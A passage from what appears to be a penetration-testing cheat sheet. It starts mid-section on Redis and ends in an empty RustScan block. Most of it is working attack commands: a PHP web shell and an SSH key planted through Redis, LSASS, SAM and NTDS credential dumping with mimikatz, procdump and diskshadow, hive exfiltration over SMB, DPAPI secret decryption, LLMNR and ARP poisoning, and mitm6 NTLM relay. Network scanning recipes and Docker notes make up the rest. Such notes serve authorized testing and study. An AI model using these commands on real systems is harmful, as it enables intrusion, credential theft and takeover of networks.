Hey, no AUTH required!
quit
+OK
Connection closed by foreign host.
```

Sensitive injection points for testing:

```
/var/www/html
/home/redis/.ssh
/var/lib/redis/.ssh
/var/spool/cron/crontabs
/var/spool/cron

$ for dname in `cat dirs.txt`; do redis-cli -h 127.0.0.1 config set dir $dname | grep OK && echo $dname; done
```



### Web Shell

* [https://book.hacktricks.xyz/pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)

```
$ redis-cli -h 127.0.0.1 flushall
$ redis-cli -h 127.0.0.1 set pwn '<?php system($_REQUEST['cmd']); ?>'
$ redis-cli -h 127.0.0.1 config set dbfilename shell.php
$ redis-cli -h 127.0.0.1 config set dir /var/www/html
$ redis-cli -h 127.0.0.1 save
```



### SSH Public Key

* [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

```
$ ssh-keygen -t ecdsa -s 521 -f key
$ (echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt
$ redis-cli -h 127.0.0.1 flushall
$ cat foo.txt | redis-cli -h 127.0.0.1 -x set pwn
$ redis-cli -h 127.0.0.1 config set dbfilename authorized_keys
$ redis-cli -h 127.0.0.1 config set dir /var/lib/redis/.ssh
$ redis-cli -h 127.0.0.1 save
```





# Docker

List all running containers:

```
$ docker ps -a
```

Stop all running containers:

```
$ docker stop `docker container ls -aq`
```

Remove stopped containers:

```
$ docker rm -v `docker container ls -aq -f status=exited`
```

Remove all images:

```
$ docker rmi `docker images -aq`
```

Attach to a running container:

```
$ docker exec -it <CONTAINER> /bin/bash
```

Unsorted:

```
$ docker start -ai <CONTAINER>
$ docker cp project/. <CONTAINER>:/root/project
$ docker run --rm -it <CONTAINER> --name <NAME> ubuntu bash
$ docker build -t <USERNAME>/<IMAGE> .
```




## Installation



### Linux


#### docker-engine

```
$ sudo apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common -y
(Ubuntu) $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
(Kali) $ curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
[$ sudo apt-key fingerprint 0EBFCD88]
(Ubuntu) $ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
(Kali) $ echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list
$ sudo apt update
[$ apt-cache policy docker-ce]
$ sudo apt install docker-ce -y
[$ sudo systemctl status docker]
$ sudo usermod -aG docker ${USER}
relogin
[$ docker run --rm hello-world]
```


#### docker-compose

* [https://docs.docker.com/compose/install/#install-compose-on-linux-systems](https://docs.docker.com/compose/install/#install-compose-on-linux-systems)

```
$ sudo curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
$ sudo chmod +x /usr/local/bin/docker-compose
$ sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose
```





# Dump Credentials




## lsass.exe



### LOLBAS


#### comsvcs.dll

* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz#comsvcs-dll)

```
PS C:\Windows\System32 > Get-Process lsass
PS C:\Windows\System32 > .\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 940 C:\temp\lsass.dmp full
```


#### ProcDump

* [https://docs.microsoft.com/en-us/sysinternals/downloads/procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
* [https://download.sysinternals.com/files/Procdump.zip](https://download.sysinternals.com/files/Procdump.zip)

Dump and parse:

```
PS > .\procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
$ pypykatz lsa minidump lsass.dmp > lsass-pypykatz.minidump
Or
mimikatz # sekurlsa::minidump lsass.dmp
```

Grep for secrets:

```
(mimikatz)
$ grep '* Username : ' lsass-mimikatz.minidump -A2 | grep -e Username -e Password -e NTLM | grep -v null | xclip -i -sel c
(pypykatz)
$ grep -P '\tusername ' lsass-pypykatz.minidump -A2 | grep -e username -e password | grep -v None | xclip -i -sel c
$ grep -P 'Username: ' lsass-pypykatz.minidump -A4 | grep -e Username -e Domain -e NT | grep -v None | xclip -i -sel c
```


#### Silent Process Exit

* [https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/](https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/)
* [https://github.com/deepinstinct/LsassSilentProcessExit](https://github.com/deepinstinct/LsassSilentProcessExit)



### Mimikatz

In case of Windows 10 version 1803-1809 use [Mimikatz v2.1.1](https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip), see [Key import error](https://github.com/gentilkiwi/mimikatz/issues/248):

```
Cmd > .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"
```


#### kiwi

```
meterpreter > getsystem
meterpreter > load kiwi
meterpreter > creds_msv
meterpreter > creds_all
meterpreter > lsa_dump_secrets
meterpreter > kiwi_cmd '"privilege::debug" "sekurlsa::logonpasswords full" "exit"'
```



### Reusing Open Handles

* [https://skelsec.medium.com/duping-av-with-handles-537ef985eb03](https://skelsec.medium.com/duping-av-with-handles-537ef985eb03)
* [https://github.com/jfmaes/SharpHandler](https://github.com/jfmaes/SharpHandler)



### Remotely

* [https://github.com/G0ldenGunSec/SharpSecDump](https://github.com/G0ldenGunSec/SharpSecDump)




## SAM



### Mimikatz

```
PS > Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "log sam.txt" "lsadump::sam" "exit"'
```




## NTDS + SAM

Locate `diskshadow.exe`:

```
cmd /c where /R C:\ diskshadow.exe
```

Create shadow volume:

```
powershell -c "Add-Content add_vol.txt 'set context persistent nowriters'"
powershell -c "Add-Content add_vol.txt 'set metadata C:\Windows\Temp\meta.cab'"
powershell -c "Add-Content add_vol.txt 'set verbose on'"
powershell -c "Add-Content add_vol.txt 'begin backup'"
powershell -c "Add-Content add_vol.txt 'add volume c: alias DCROOT'"
powershell -c "Add-Content add_vol.txt 'create'"
powershell -c "Add-Content add_vol.txt 'expose %DCROOT% w:'"
powershell -c "Add-Content add_vol.txt 'end backup'"
cmd /c diskshadow.exe /s add_vol.txt
```

```
// add_vol.txt
set context persistent nowriters
set metadata C:\Windows\Temp\meta.cab
set verbose on
begin backup
add volume c: alias DCROOT
create
expose %DCROOT% w:
end backup
```

Exfiltrate over SMB:

```
mkdir C:\smb_pentest
copy w:\Windows\NTDS\ntds.dit C:\smb_pentest\ntds.dit
cmd /c reg.exe save hklm\system C:\smb_pentest\system.hive
cmd /c reg.exe save hklm\sam C:\smb_pentest\sam.hive
cmd /c reg.exe save hklm\security C:\smb_pentest\security.hive
cmd /c net share pentest=c:\smb_pentest /GRANT:"Everyone,FULL"

$ smbclient.py 'snovvcrash:Passw0rd!@127.0.0.1'
> use pentest
> get ntds.dit
> get system.hive
> get sam.hive
> get security.hive
```

Delete shadow volume:

```
powershell -c "Add-Content delete_vol.txt 'set context persistent nowriters'"
powershell -c "Add-Content delete_vol.txt 'set metadata C:\Windows\Temp\meta.cab'"
powershell -c "Add-Content delete_vol.txt 'set verbose on'"
powershell -c "Add-Content delete_vol.txt 'unexpose w:'"
powershell -c "Add-Content delete_vol.txt 'delete shadows volume c:'"
powershell -c "Add-Content delete_vol.txt 'reset'"
cmd /c diskshadow.exe /s delete_vol.txt
```

```
// delete_vol.txt
set context persistent nowriters
set metadata C:\Windows\Temp\meta.cab
set verbose on
unexpose w:
delete shadows volume c:
reset
```

Clean up:

```
cmd /c net share pentest /delete
rm -re -fo C:\smb_pentest
rm C:\Windows\Temp\meta.cab
rm add_vol.txt
rm delete_vol.txt
```

Parse secrets:

```
$ secretsdump.py [-pwd-last-set] [-user-status] [-history] -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
```




## master.mdf

* [https://xpnsec.tumblr.com/post/145350063196/reading-mdf-hashes-with-powershell](https://xpnsec.tumblr.com/post/145350063196/reading-mdf-hashes-with-powershell)
* [https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes)
* [https://www.nucleustechnologies.com/blog/mdf-file-location-in-sql-server-2014-2016-2017/](https://www.nucleustechnologies.com/blog/mdf-file-location-in-sql-server-2014-2016-2017/)

```
PS > Get-MDFHashes -mdf C:\Invoke-MDFHashes\master.mdf
```




## DPAPI

Master keys locations (hidden files, need `-Force`):

```
PS > ls -fo C:\Users\snovvcrash\AppData\Roaming\Microsoft\Protect\ (%appdata%\Microsoft\Protect\)
PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Protect\ (%localappdata%\Microsoft\Protect\)
```

Credential files locations (hidden files, need `-Force`):

```
PS > ls -fo C:\Users\snovvcrash\AppData\Roaming\Microsoft\Credentials\ (%appdata%\Microsoft\Credentials\)
PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\ (%localappdata%\Microsoft\Credentials\)
```

Unhide files:

```
PS > cmd /c "attrib -h -s 00ff00ff-00ff-00ff-00ff-00ff00ff00ff
PS > cmd /c "attrib -h -s 00ff00ff00ff00ff00ff00ff00ff00ff"
```



### Mimikatz

* [https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/)

Decrypt manually offline with known plaintext password:

```
mimikatz # dpapi::masterkey /in:00ff00ff-00ff-00ff-00ff-00ff00ff00ff /sid:S-1-5-21-4124311166-4116374192-336467615-500 /password:Passw0rd!
mimikatz # dpapi::cache
mimikatz # dpapi::cred /in:00ff00ff00ff00ff00ff00ff00ff00ff
```



### SharpDPAPI

* [https://github.com/GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpDPAPI.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpDPAPI.ps1)

```
PS > .\SharpDPAPI.exe triage /password:Passw0rd!
PS > .\SharpDPAPI.exe machinetriage [/password:Passw0rd!]
```




## Credential Manager



### Mimikatz

```
Cmd > .\mimikatz.exe "privilege::debug" "vault::cred /patch" "exit"
```





# Engagement

```
$ cd ~/ws/  # workspace
$ mkdir -p discover/{nmap,services} enum/bloodhound/bloodhound.py loot/ log/ screenshots/ shells/ tickets/ traffic/
```




## Network Config

```
$ ifconfig eth0
$ route -n
$ cat /etc/resolve.conf
$ arp -a
```




## Network Attacks



### Sniff Traffic


#### tcpdump

While connected via SSH:

```
$ tcpdump -i eth0 -w dump.pcap -s0 'not tcp port 22' &
```


#### Wireshark

* [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

##### Filters

Broadcast/multicast, IPv6 packets:

```
ssdp || arp || llmnr || nbns || mdns || icmpv6 || dhcpv6
```

Arpspoof:

```
(http || ftp || smb || smb2 || ldap) && ip.src == VICTIM_10.0.0.5
```



### LLMNR/NBNS Poisoning


#### Responder

* [https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
* [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://markclayton.github.io/where-are-my-hashes-responder-observations.html](https://markclayton.github.io/where-are-my-hashes-responder-observations.html)

```
$ git clone https://github.com/lgandx/Responder
$ sudo ./Responder.py -I eth0 -wfrd -P -v

$ head -n 1 logs/*.txt | grep -v -e logs -e '^$' -e anonymous | sort -u -t: -k1,1 > ~/ws/loot/net-ntlmv2.responder
$ sort -u -t: -k1,1 ~/ws/loot/net-ntlmv2.responder >> ~/ws/loot/net-ntlmv2.txt && rm ~/ws/loot/net-ntlmv2.responder
```


#### Inveigh

* [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)

```
PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y
```

##### InveighZero

* [https://github.com/Kevin-Robertson/InveighZero](https://github.com/Kevin-Robertson/InveighZero)
* [https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)

```
PS > .\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]
```



### ARP Spoofing

Enable IP forwarding:

```
$ sudo sysctl -w net.ipv4.ip_forward=1
(sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward')
(edit /etc/sysctl.conf "net.ipv4.ip_forward = 1" to make it permanent)
```


#### arpspoof [dsniff]

* [https://github.com/tecknicaltom/dsniff](https://github.com/tecknicaltom/dsniff)

Install:

```
$ sudo apt install dsniff -y
```

Fire up the attack with Wireshark (filter `ip.src == VICTIM_10.0.0.5`) running:

```
$ sudo arpspoof -c both -t VICTIM_10.0.0.5 GATEWAY_10.0.0.1
```


#### bettercap

* [https://github.com/bettercap/bettercap](https://github.com/bettercap/bettercap)
* [https://www.bettercap.org/modules/](https://www.bettercap.org/modules/)
* [https://linuxhint.com/install-bettercap-on-ubuntu-18-04-and-use-the-events-stream/](https://linuxhint.com/install-bettercap-on-ubuntu-18-04-and-use-the-events-stream/)
* [https://hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy](https://hackernoon.com/man-in-the-middle-attack-using-bettercap-framework-hd783wzy)
* [https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets](https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets)

Deb dependencies (Ubuntu 18.04 LTS):

* [libpcap0.8_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8_1.8.1-6ubuntu1_amd64.deb.html)
* [libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap0.8-dev_1.8.1-6ubuntu1_amd64.deb.html)
* [libpcap-dev_1.8.1-6ubuntu1_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libpcap-dev_1.8.1-6ubuntu1_amd64.deb.html)
* [pkg-config_0.29.1-0ubuntu2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/pkg-config_0.29.1-0ubuntu2_amd64.deb.html)
* [libnetfilter-queue1_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue1_1.0.2-2_amd64.deb.html)
* [libnfnetlink-dev_1.0.1-3_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-main-amd64/libnfnetlink-dev_1.0.1-3_amd64.deb.html)
* [libnetfilter-queue-dev_1.0.2-2_amd64.deb](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/libnetfilter-queue-dev_1.0.2-2_amd64.deb.html)



### DHCPv6 Spoofing


#### mitm6

* [https://github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)
* [https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
* [https://intrinium.com/mitm6-pen-testing/](https://intrinium.com/mitm6-pen-testing/)

Install:

```
$ git clone https://github.com/fox-it/mitm6 ~/tools/mitm6 && cd ~/tools/mitm6
$ python3 setup.py install
Or
$ pipx install -f "git+https://github.com/fox-it/mitm6.git"
```

Run:

```
$ sudo smbserver.py -smb2support share `pwd` | tee -a ~/ws/log/mitm6-smbserver.out
$ sudo mitm6.py -i eth0 -d megacorp.local --ignore-nofqdn

$ cat ~/ws/log/mitm6-smbserver.out | grep 'authenticated successfully' -A1 | grep aaaaaaaaaaaaaaaa | cut -c 5- | grep -v '\$' > ~/ws/loot/net-ntlmv2.mitm6
$ sort -u -t: -k1,1 ~/ws/loot/net-ntlmv2.mitm6 >> ~/ws/loot/net-ntlmv2.txt && rm ~/ws/loot/net-ntlmv2.mitm6

$ cat ~/ws/log/mitm6-smbserver.out | grep 'authenticated successfully' -A1 | grep aaaaaaaaaaaaaaaa | grep '\$' | cut -c 5- | sort -u -t: -k1,1
```

##### Attack vectors

Grab hashes with `smbserver.py` (passive):

1. `mitm6.py` poisons IPv6 DNS entries for all hosts in the `/24` network.
2. Victims start to use attacker's machine as the primary DNS server.
3. `mitm6.py` on the attacker's machine acts like a rogue DNS server and responds with the attacker's IP for all incoming queries.
4. `smbserver.py` collects hashes during SMB requests from victims.

Relay authentication with ntlmrelayx.py (active):

1. `mitm6.py` poisons IPv6 DNS entries for all hosts in the `/24` network.
2. Victims start to use attacker's machine as the primary DNS server.
3. `mitm6.py` on the attacker's machine acts like a rogue DNS server, `ntlmrelayx.py` serves a malicious WPAD file with an inexistent hostname (which will be resolved to the attacker's IP anyway) and acts like a rogue proxy server and `mitm6.py` responds with the attacker's IP for all the incoming DNS queries.
4. Victims grab the WPAD file and ask the rogue IPv6 DNS server (attacker's machine) to resolve its location - resolved to attacker's machine.
5. Victims go to the rogue proxy server and there `ntlmrelayx.py` responses with `HTTP 407 Proxy Authentication`.




## Host Discovery



### ARP

* [http://edublog.bitcrack.net/2016/09/scanning-network-using-netdiscover-arp.html](http://edublog.bitcrack.net/2016/09/scanning-network-using-netdiscover-arp.html)
* [https://null-byte.wonderhowto.com/how-to/use-abuse-address-resolution-protocol-arp-locate-hosts-network-0150333/](https://null-byte.wonderhowto.com/how-to/use-abuse-address-resolution-protocol-arp-locate-hosts-network-0150333/)
* [https://www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/](https://www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/)


#### arp-scan

Active:

```
$ arp-scan -l [-s <SPOOFED_IP>] -v
$ arp-scan -I eth0 192.168.0.0/24
```


#### netdiscover

Passive:

```
$ netdiscover -i eth0 -r 192.168.0.0/24 -p
```

Active, sending 20 requests per IP:

```
$ netdiscover -i eth0 -r 192.168.0.0/24 -c 20
```



### Hunting for Subnets

* [https://hub.packtpub.com/optimize-scans/](https://hub.packtpub.com/optimize-scans/)

Take `10.0.0.0/8` as an example:

```
$ nmap -n -sn 10.0-255.0-255.1 -oA subnets/gateways -PE --min-rate 10000 --min-hostgroup 10000
$ grep 'Up' subnets/gateways.gnmap |cut -d' ' -f2 > subnets/ranges.txt

$ sed -i subnets/ranges.txt -e 's/$/\/24/'
```



### Ping Sweep

Bash:

```
$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 $NET.$i > /dev/null && echo "$NET.$i" |tee -a sweep.txt &); done
Or
$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 "$NET.$i" |grep 'bytes from' |cut -d' ' -f4 |cut -d':' -f1 |tee -a sweep.txt &); done

$ sort -u -t'.' -k4,4n sweep.txt > hosts/targets.txt && rm sweep.txt
```

Batch:

```
Cmd > set "NET=10.5.5" && for /L %i in (1,1,255) do @ping -n 1 -w 200 %NET%.%i > nul && echo %NET%.%i > sweep.txt
```

PowerShell (option 1):

```
PS > echo "[*] Scanning in progress...";1..254 |ForEach-Object {Get-WmiObject Win32_PingStatus -Filter "Address='10.10.100.$_' and Timeout=50 and ResolveAddressNames='false' and StatusCode=0" |select ProtocolAddress* |Out-File -Append -FilePath .\sweep.txt};echo "[+] Live hosts:"; Get-Content -Path .\sweep.txt | ? { $_ -match "10.10.100" }; echo "[*] Done.";del .\sweep.txt
```

PowerShell (option 2):

```
PS > $NET="192.168.0";for($i=1;$i -lt 255;$i++){$command="ping -n 1 -w 100 $NET.$i > nul 2>&1 && echo $NET.$i";start-process -nonewwindow cmd -argumentlist "/c $command" -redirectstandardoutput "tmp$i.txt"};cat tmp*.txt > sweep.txt
PS > rm tmp*.txt
```

Nmap:

```
$ nmap -n -sn -iL subnets/ranges.txt -oA hosts/pingsweep -PE
$ grep 'Up' hosts/pingsweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > hosts/targets.txt
```



### RMI Sweep

Remote Management Interfaces:

| Port |      Service       |
|------|--------------------|
|   22 | SSH                |
| 3389 | RDP                |
| 2222 | SSH?               |
| 5900 | VNC                |
| 5985 | WinRM              |
| 5986 | WinRM over SSL/TLS |

Nmap:

```
$ nmap -n -Pn -iL subnets/ranges.txt -oA hosts/rmisweep -p22,3389,2222,5900,5985,5986 [--min-rate 1280 --min-hostgroup 256]
$ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n >> hosts/targets.txt
```

`Invoke-Portscan.ps1`:

* [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1)
* [https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/)

```
PS > Invoke-Portscan -Hosts 127.0.0.0/24 -sn -noProgressMeter
PS > Invoke-Portscan -Hosts 127.0.0.0/24 -T 4 -TopPorts 25 -oA top25
PS > Invoke-Portscan -Hosts 127.0.0.1 -Pn -Ports "22,80,443" -oG ports
```




## Services

Automators:

* [https://github.com/21y4d/nmapAutomator](https://github.com/21y4d/nmapAutomator)
* [https://github.com/Tib3rius/AutoRecon](https://github.com/Tib3rius/AutoRecon)
* [https://github.com/carlospolop/legion](https://github.com/carlospolop/legion)



### Raw Identification

```
$ nc -nv 10.10.13.37 4444 [-C]
```



### Nmap XML Parsers

`parsenmap.rb`:

* [https://github.com/R3dy/parsenmap](https://github.com/R3dy/parsenmap)

```
$ git clone https://github.com/R3dy/parsenmap-rb ~/tools/parsenmap-rb && cd ~/tools/parsenmap-rb
$ bundle install && ln -s ~/tools/parsenmap-rb/parsenmap.rb /usr/local/bin/parsenmap.rb && cd -
$ parsenmap.rb --help
```

`nmaptocsv`:

* [https://github.com/maaaaz/nmaptocsv](https://github.com/maaaaz/nmaptocsv)

```
$ git clone https://github.com/maaaaz/nmaptocsv ~/tools/nmaptocsv && cd ~/tools/nmaptocsv
$ python3 -m pip install -r requirements.txt csvkit && ln -s ~/tools/nmaptocsv/nmaptocsv.py /usr/local/bin/nmaptocsv.py && cd -
$ nmaptocsv.py --help
```



### Ports (Quick)

Echo:

```
$ IP="0.0.0.0"; for p in $(seq 1 49151); do (timeout 1 bash -c "echo '.' >/dev/tcp/$IP/$p && echo OPEN:$p" >> hosts/ports.txt &) 2>/dev/null; done
$ sort -u -t':' -k1,1n hosts/ports.txt > hosts/echo-ports.txt && rm hosts/ports.txt
```

Netcat:

```
$ seq 1 49151 | xargs -n1 | xargs -P0 -I {} nc -nzv -w1 0.0.0.0 {} 2>&1 | grep -vE "timed out|now in progress|Connection refused"
```

Nmap:

```
$ nmap -n -Pn -iL hosts/targets.txt -oA services/?-top-ports [--top-ports ? -T4 --min-rate 1280 --min-hostgroup 256]
$ grep 'open' services/?-top-ports.gnmap
$ parsenmap.rb services/?-top-ports.xml
$ nmaptocsv.py -x services/?-top-ports.xml -d',' -f ip-fqdn-port-protocol-service-version-os |csvlook -I

$ nmap -n -Pn -iL hosts/targets.txt -oA services/quick-sweep -p22,25,53,80,443,445,1433,3306,3389,5800,5900,8080,8443 [-T4 --min-rate 1280 --min-hostgroup 256]
$ grep 'open' services/quick-sweep.gnmap
$ parsenmap.rb services/quick-sweep.xml
$ nmaptocsv.py -x services/quick-sweep.xml -d',' -f ip-fqdn-port-protocol-service-version-os |csvlook -I
```



### Ports (Full)

```
$ nmap -Pn -T3 [--min-rate 50000 --min-hostgroup 256] -sV --version-intensity 6 -iL targets.txt --open -p1-49151 -oA services/alltcp-versions
```

Define which NSE scripts ran:

```
$ grep '|_' services/alltcp-versions.nmap |cut -d'_' -f2 |cut -d' ' -f1 |sort -u |grep ':'
```

Look at HTTP titles:

```
$ grep -i 'http-title' services/alltcp-versions.nmap
```

Examine version scan:

```
$ parsenmap.rb services/alltcp-versions.xml > services/alltcp-versions.csv
Or
nmaptocsv.py -x services/alltcp-versions.xml -d',' -f ip-fqdn-port-protocol-service-version-os > services/alltcp-versions.csv
```

Split version scan by service names:

```
$ parsenmap.py -i services/alltcp-versions.xml
```



### Tricks

Grep only numbers to get a comma-separated list of ports:

```
$ cat nmap/initial.nmap | egrep -o '^[0-9]{1,5}' | awk -F/ '{ print $1 }' ORS=','; echo
```

Fast port discovery with Masscan + versions and scripts with Nmap:

```
$ sudo masscan --rate 1000 -e tun0 -p1-65535,U:0-65535 127.0.0.1 > masscan/ports
$ ports=`cat masscan/ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
$ sudo nmap -n -Pn -sVC [-sT] [-A] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports
```

Fast port discovery with Nmap + versions and scripts with Nmap (TCP & UDP):

```
$ sudo nmap -n -Pn --min-rate 1000 -T4 127.0.0.1 -p- -v --open | tee nmap/ports_tcp.txt
$ ports_tcp=`cat nmap/ports_tcp | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
$ sudo nmap -n -Pn -sVC [-sT] [-A] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports_tcp

$ sudo nmap -n -Pn -sU [--max-retries 1] 127.0.0.1 -v --open | tee nmap/ports_udp.txt
$ ports_udp=`cat nmap/ports_udp | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
$ sudo nmap -n -Pn -sVCU [--reason] -oA nmap/udp 127.0.0.1 -p$ports_udp
```

Search for Nmap NSE scripts:

```
$ find /usr/share/nmap/scripts/ -type f | grep smb
Or
$ sudo nmap --script-updatedb
$ cat /usr/share/nmap/scripts/script.db | grep smb
```


#### Port Scanners

Top TCP ports:

| Port                                         | Service                          |
|----------------------------------------------|----------------------------------|
| 21                                           | FTP                              |
| 22,2222                                      | SSH                              |
| 23                                           | Telnet                           |
| 25                                           | SMTP                             |
| 53                                           | DNS                              |
| 80,8080                                      | HTTP                             |
| 88                                           | KDC                              |
| 111                                          | SUNRPC                           |
| 135                                          | MSRPC                            |
| 137                                          | NetBIOS                          |
| 139,445                                      | SMB over NetBIOS,SMB over TCP/IP |
| 389,636                                      | LDAP,LDAP over SSL/TLS           |
| 443,8443                                     | SSL/TLS                          |
| 593                                          | HTTP RPC Endpoint Mapper         |
| 623                                          | IPMI                             |
| 873                                          | RSYNC                            |
| 1090,1098,1099,4444,11099,47001,47002,10999  | Java RMI                         |
| 1433                                         | MSSQL                            |
| 1521                                         | Oracle                           |
| 2049                                         | NFS                              |
| 2375                                         | Docker                           |
| 3268,3269                                    | Microsoft Global Catalog         |
| 3306                                         | MySQL/MariaDB                    |
| 3389                                         | RDP                              |
| 4786                                         | Cisco Smart Install              |
| 4848                                         | GlassFish                        |
| 4990                                         | Atlassian Crowd                  |
| 5432                                         | PostgreSQL                       |
| 5555,5556                                    | HP Data Protector                |
| 5900                                         | VNC                              |
| 5985,5986                                    | WinRM,WinRM over SSL/TLS         |
| 6066                                         | Apache Spark                     |
| 6379                                         | Redis                            |
| 7000-7004,8000-8003,9000-9003,9503,7070,7071 | WebLogic                         |
| 8088                                         | Apache Hadoop                    |
| 8383                                         | Zoho Manageengine Desktop        |
| 8500                                         | Hashicorp Consul                 |
| 8686,9012,50500                              | JMX                              |
| 8880                                         | IBM WebSphere                    |
| 8888                                         | Tornado                          |
| 8983                                         | Apache Solr                      |
| 9000                                         | Portainer                        |
| 9100                                         | Printing                         |
| 9200                                         | Elasticsearch                    |
| 9389                                         | Active Directory Web Services    |
| 11111,4444,4445                              | jBoss                            |
| 27017                                        | MongoDB                          |
| 45000,45001                                  | JDWP                             |

TCP one-liner:

```
ports_tcp="21,22,23,25,53,80,88,111,135,137,139,389,443,445,593,623,636,873,1090,1098,1099,1433,1521,2049,2222,2375,3268,3269,3306,3389,4444,4445,4786,4848,4990,5432,5555,5556,5900,5985,5986,6066,6379,7000,7001,7002,7003,7004,7070,7071,8000,8001,8002,8003,8080,8088,8383,8443,8500,8686,8880,8888,8983,9000,9001,9002,9003,9012,9100,9200,9389,9503,10999,11099,11111,27017,45000,45001,47001,47002,50500"
```

Top UDP ports:

| Port |  Service   |
|------|------------|
|   53 | DNS        |
|   67 | DHCP       |
|   69 | TFTP       |
|   88 | KDC        |
|  123 | NTP        |
|  137 | NetBIOS    |
|  161 | SNMP       |
|  500 | IKE        |
|  623 | IPMI       |
| 3391 | RD Gateway |

UDP one-liner:

```
ports_udp="53,67,69,88,123,137,161,500,623,3391"
```

##### Masscan

* [https://github.com/robertdavidgraham/masscan](https://github.com/robertdavidgraham/masscan)

```
$ sudo masscan [-e eth0] --rate 1000 -iL hosts.txt --open -p$ports --resume paused.conf >> masscan.out
$ mkdir services && for p in `echo $ports | tr ',' ' '`; do grep "port $p/tcp" masscan.out | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
```

##### RustScan

* [https://github.com/RustScan/RustScan/wiki/Usage](https://github.com/RustScan/RustScan/wiki/Usage)

```
